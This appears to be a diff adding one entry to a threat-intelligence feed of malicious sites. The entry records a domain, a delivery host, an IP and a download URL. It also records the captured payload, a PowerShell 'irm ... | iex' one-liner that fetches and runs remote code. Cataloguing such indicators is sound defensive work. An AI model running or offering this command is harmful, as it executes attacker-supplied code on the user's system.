@@ -468,5 +468,27 @@
     ],
     "ReportId": "cmwk7brz41bwj0omlleavf342",
     "ScannedAt": "2026-11-17T04:37:54.985000+00:00"
+  },
+  {
+    "UrlDomain": "aureoforpet.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "187.53.137.160"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/84afd8114832f24a",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/84afd8114832f24a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/84afd8114832f24a"
+    ],
+    "ReportId": "cmwk80t2i1crc0omlburw9jvx",
+    "ScannedAt": "2026-11-17T04:57:22.797000+00:00"
   }
 ]
